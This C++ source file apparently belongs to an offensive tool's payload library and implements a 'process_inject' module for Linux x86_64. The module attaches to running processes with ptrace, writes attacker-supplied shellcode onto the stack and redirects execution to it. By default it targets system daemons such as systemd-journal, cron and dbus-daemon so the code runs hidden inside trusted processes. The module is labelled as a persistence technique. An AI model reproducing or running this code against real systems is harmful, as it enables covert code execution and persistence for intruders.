#if defined(__linux__) && defined(__x86_64__)

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

#include <algorithm>
#include <cctype>
#include <cerrno>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

struct Target {
    int pid = 0;
    std::string name;
    std::string status;
    std::string details;
};

std::vector<std::string> fields(const std::string& s) {
    std::vector<std::string> out;
    size_t i = 0;
    while (i < s.size()) {
        while (i < s.size() && std::isspace((unsigned char)s[i])) i++;
        size_t start = i;
        while (i < s.size() && !std::isspace((unsigned char)s[i])) i++;
        if (i > start) out.push_back(s.substr(start, i - start));
    }
    return out;
}

std::vector<std::string> split_nl(const std::string& s) {
    std::vector<std::string> out;
    size_t start = 0;
    for (;;) {
        size_t pos = s.find('\n', start);
        if (pos == std::string::npos) {
            out.push_back(s.substr(start));
            break;
        }
        out.push_back(s.substr(start, pos - start));
        start = pos + 1;
    }
    return out;
}

int scan_int(const std::string& s) {
    return (int)std::strtol(s.c_str(), nullptr, 10);
}

std::vector<unsigned char> hex_decode(const std::string& s) {
    std::vector<unsigned char> data;
    for (size_t i = 0; i + 1 < s.size(); i += 2) {
        unsigned int b = 0;
        if (std::sscanf(s.substr(i, 2).c_str(), "%2x", &b) != 1) b = 0;
        data.push_back((unsigned char)b);
    }
    return data;
}

std::vector<Target> find_processes(const std::string& name) {
    std::vector<Target> targets;
    CmdResult res = run_cmd_out({"ps", "aux"});
    if (!res.ok) return targets;
    for (const std::string& line : split_nl(res.out)) {
        if (line.find(name) == std::string::npos) continue;
        std::vector<std::string> f = fields(line);
        if (f.size() > 1) {
            int pid = scan_int(f[1]);
            if (pid > 0 && pid != (int)::getpid()) {
                Target t;
                t.pid = pid;
                t.name = f.back();
                targets.push_back(t);
            }
        }
    }
    return targets;
}

std::vector<Target> find_benign_processes() {
    static const char* const kBenign[] = {"systemd-journal", "systemd-logind", "cron",
                                          "irqbalance",    "dbus-daemon"};
    std::vector<Target> targets;
    for (const char* n : kBenign) {
        std::vector<Target> found = find_processes(n);
        targets.insert(targets.end(), found.begin(), found.end());
    }
    return targets;
}

Target inject_shellcode(int pid, const std::string& shellcode_hex) {
    Target t;
    t.pid = pid;
    t.status = "failed";

    std::string comm;
    if (read_file("/proc/" + std::to_string(pid) + "/comm", comm)) t.name = trim(comm);

    int err = 0;
    if (!mut_ptrace_attach(pid, err)) {
        t.details = std::string("ptrace attach failed: ") + errno_text(err);
        return t;
    }

    int status = 0;
    if (waitpid(pid, &status, 0) < 0) {
        int e = errno;
        ::ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        t.details = "wait failed: " + errno_text(e);
        return t;
    }

    struct user_regs_struct regs;
    std::memset(&regs, 0, sizeof(regs));
    if (::ptrace(PTRACE_GETREGS, pid, nullptr, &regs) != 0) {
        int e = errno;
        ::ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        t.details = "getregs failed: " + errno_text(e);
        return t;
    }

    if (shellcode_hex.empty()) {
        ::ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        t.details = "no shellcode provided";
        return t;
    }
    std::vector<unsigned char> shellcode = hex_decode(shellcode_hex);

    for (size_t i = 0; i < shellcode.size(); i += 8) {
        uint64_t word = 0;
        for (size_t j = 0; j < 8 && i + j < shellcode.size(); j++)
            word |= (uint64_t)shellcode[i + j] << (j * 8);
        unsigned long addr =
            (unsigned long)(regs.rsp - (uint64_t)shellcode.size() + (uint64_t)i);
        if (::ptrace(PTRACE_POKEDATA, pid, (void*)addr, (void*)word) != 0) {
            int e = errno;
            t.details = "pokedata failed at offset " + std::to_string(i) + ": " + errno_text(e);
            ::ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
            return t;
        }
    }

    regs.rip = regs.rsp - (uint64_t)shellcode.size();
    if (::ptrace(PTRACE_SETREGS, pid, nullptr, &regs) != 0) {
        int e = errno;
        ::ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        t.details = "setregs failed: " + errno_text(e);
        return t;
    }

    if (::ptrace(PTRACE_DETACH, pid, nullptr, nullptr) != 0) {
        t.details = "detach failed: " + errno_text(errno);
        return t;
    }

    t.status = "success";
    t.details = "Injected " + std::to_string(shellcode.size()) + " bytes shellcode";
    return t;
}

class ProcessInject : public Payload {
  public:
    const char* name() const override { return "process_inject"; }
    const char* category() const override { return "persistence"; }
    const char* description() const override {
        return "Linux process injection via ptrace (requires root)";
    }

    Output execute(const Args& args) const override {
        std::string pid_str, name, shellcode;
        auto get = [&](const char* k) -> std::string {
            auto it = args.find(k);
            return it == args.end() ? std::string() : it->second;
        };
        pid_str = get("pid");
        name = get("name");
        shellcode = get("shellcode");

        OJ r = OJ::object();
        r["timestamp"] = now_rfc3339();
        OJ targets = OJ::array();
        OJ results = OJ::array();

        if (::geteuid() != 0) {
            results.push_back("Root privileges required for ptrace injection");
            r["targets"] = nullptr;
            r["results"] = results;
            std::string s = MarshalJSON(r);
            return Output(s.begin(), s.end());
        }

        if (!pid_str.empty()) {
            int pid = scan_int(pid_str);
            if (pid > 0) {
                Target t = inject_shellcode(pid, shellcode);
                push_target(targets, t);
                results.push_back("PID " + std::to_string(pid) + ": " + t.status);
                r["targets"] = targets;
                r["results"] = results;
                std::string s = MarshalJSON(r);
                return Output(s.begin(), s.end());
            }
        }

        if (!name.empty()) {
            std::vector<Target> found = find_processes(name);
            size_t cap = std::min<size_t>(2, found.size());
            for (size_t i = 0; i < cap; ++i) {
                Target t = inject_shellcode(found[i].pid, shellcode);
                push_target(targets, t);
                results.push_back("PID " + std::to_string(found[i].pid) + " (" + found[i].name +
                                  "): " + t.status);
            }
            r["targets"] = targets.empty() ? OJ(nullptr) : targets;
            r["results"] = results.empty() ? OJ(nullptr) : results;
            std::string s = MarshalJSON(r);
            return Output(s.begin(), s.end());
        }

        std::vector<Target> found = find_benign_processes();
        size_t cap = std::min<size_t>(2, found.size());
        for (size_t i = 0; i < cap; ++i) {
            Target t = inject_shellcode(found[i].pid, shellcode);
            push_target(targets, t);
            results.push_back("PID " + std::to_string(found[i].pid) + " (" + found[i].name +
                              "): " + t.status);
        }
        r["targets"] = targets.empty() ? OJ(nullptr) : targets;
        r["results"] = results.empty() ? OJ(nullptr) : results;
        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }

  private:
    static void push_target(OJ& targets, const Target& t) {
        OJ o = OJ::object();
        o["pid"] = t.pid;
        o["name"] = t.name;
        o["status"] = t.status;
        if (!t.details.empty()) o["details"] = t.details;
        targets.push_back(o);
    }
};

ProcessInject g_process_inject;

struct Reg { Reg() { Register(&g_process_inject); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads

#elif defined(__linux__)

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

class ProcessInjectStub : public Payload {
  public:
    const char* name() const override { return "process_inject"; }
    const char* category() const override { return "persistence"; }
    const char* description() const override {
        return "Linux process injection via ptrace (linux/amd64 only)";
    }

    Output execute(const Args&) const override {
        throw PayloadError("process_inject is only supported on linux/amd64");
    }
};

ProcessInjectStub g_process_inject_stub;

struct Reg { Reg() { Register(&g_process_inject_stub); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads

#else

namespace snake::payloads {
namespace {
[[maybe_unused]] constexpr int kProcessInjectUnsupported = 1;
}  // namespace
}  // namespace snake::payloads

#endif
